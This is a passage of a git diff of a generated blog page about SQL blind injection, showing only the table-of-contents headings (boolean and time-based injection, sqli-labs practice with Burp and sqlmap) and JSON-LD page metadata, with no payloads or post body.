class="toc-text">布尔型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#left-a-b-%E5%87%BD%E6%95%B0"><span class="toc-text">left(a,b)函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr-%E6%88%96-substring-%E5%87%BD%E6%95%B0"><span class="toc-text">substr() 或 substring()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ord-mid-%E5%87%BD%E6%95%B0"><span class="toc-text">ord() mid()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cast-%E5%92%8C-convert-%E5%87%BD%E6%95%B0"><span class="toc-text">cast() 和 convert()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ifnull-%E5%87%BD%E6%95%B0"><span class="toc-text">ifnull()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sleep-%E6%88%96benchmark"><span class="toc-text">sleep()或benchmark()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5-1"><span class="toc-text">时间注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%9C%A8%E4%BD%BF%E7%94%A8%E5%BB%B6%E8%BF%9F%E5%87%BD%E6%95%B0%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9C%89%E4%B8%A4%E4%B8%AA%E9%80%89%E6%8B%A9%EF%BC%9A"><span class="toc-text">基于时间的盲注在使用延迟函数上可以有两个选择：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Xpath%E7%B1%BB%E5%9E%8B%E5%87%BD%E6%95%B0-mysql-version-gt-x3D-5-1-5"><span class="toc-text">Xpath类型函数(mysql version &gt;&#x3D; 5.1.5)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue()</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E5%AE%9E%E6%88%98"><span class="toc-text">盲注实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8"><span class="toc-text">手工注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#burp%E8%B7%91%E7%9B%B2%E6%B3%A8"><span class="toc-text">burp跑盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E8%B7%91%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">sqlmap跑布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">时间盲注</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E4%BB%8B%E7%BB%8D"><span class="toc-text"> 盲注介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text"> 布尔注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="toc-text"> 时间注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E6%8E%8C%E6%8F%A1%E7%9A%84%E5%87%A0%E7%A7%8D%E5%87%BD%E6%95%B0"><span class="toc-text"> 需要掌握的几种函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#length"><span class="toc-text"> length()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#substr"><span class="toc-text"> substr()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ascii"><span class="toc-text"> ascii()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep"><span class="toc-text"> sleep()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ifexpr1expr2expr3"><span class="toc-text"> if(expr1,expr2,expr3)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-text"> 补充</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B"><span class="toc-text"> 布尔型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#leftab%E5%87%BD%E6%95%B0"><span class="toc-text"> left (a,b) 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#substr-%E6%88%96-substring%E5%87%BD%E6%95%B0"><span class="toc-text"> substr () 或 substring () 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ord-mid%E5%87%BD%E6%95%B0"><span class="toc-text"> ord () mid () 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cast-%E5%92%8C-convert%E5%87%BD%E6%95%B0"><span class="toc-text"> cast () 和 convert () 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ifnull%E5%87%BD%E6%95%B0"><span class="toc-text"> ifnull () 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sleep%E6%88%96benchmark"><span class="toc-text"> sleep () 或 benchmark ()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5-2"><span class="toc-text"> 时间注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%9C%A8%E4%BD%BF%E7%94%A8%E5%BB%B6%E8%BF%9F%E5%87%BD%E6%95%B0%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9C%89%E4%B8%A4%E4%B8%AA%E9%80%89%E6%8B%A9"><span class="toc-text"> 基于时间的盲注在使用延迟函数上可以有两个选择：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xpath%E7%B1%BB%E5%9E%8B%E5%87%BD%E6%95%B0mysql-version-515"><span class="toc-text"> Xpath 类型函数 (mysql version&gt;&#x3D; 5.1.5)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue"><span class="toc-text"> extractvalue()</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E5%AE%9E%E6%88%98"><span class="toc-text"> 盲注实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text"> 布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8"><span class="toc-text"> 手工注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#burp%E8%B7%91%E7%9B%B2%E6%B3%A8"><span class="toc-text"> burp 跑盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E8%B7%91%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text"> sqlmap 跑布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text"> 时间盲注</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3424,7 +3513,7 @@ sqli-labs-9输入正确的id
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/SQL注入/","name":"SQL注入"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2022/12/25/SQL盲注/","name":"SQL盲注"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SQL盲注","description":"SQL盲注","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/","wordCount":5,"datePublished":"2022-12-25T06:37:01.000Z","dateModified":"2022-12-25T07:21:54.000Z","articleSection":"SQL注入","keywords":"SQL注入","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/SQL注入/","name":"SQL注入"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2022/12/25/SQL盲注/","name":"SQL盲注"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"SQL盲注","description":"# SQL 盲注","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2022/12/25/SQL%E7%9B%B2%E6%B3%A8/","wordCount":8,"datePublished":"2022-12-25T06:37:01.000Z","dateModified":"2022-12-25T07:21:54.000Z","articleSection":"SQL注入","keywords":"SQL注入","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
